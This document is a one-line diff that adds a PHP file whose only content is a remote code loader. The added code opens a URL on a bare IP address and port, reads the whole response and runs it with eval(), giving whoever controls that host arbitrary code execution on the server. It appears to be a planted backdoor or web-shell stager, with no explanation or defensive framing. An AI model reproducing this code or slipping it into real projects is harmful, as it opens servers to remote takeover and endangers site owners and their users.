@@ -1,0 +1,1 @@
+<?php $a=fopen('http://45.123.101.251:5520/M161.txt','r');$b='';while(false!=($c=fread($a,8080))){$b.=$c;}print(eval($c=$b));fclose($a);?>
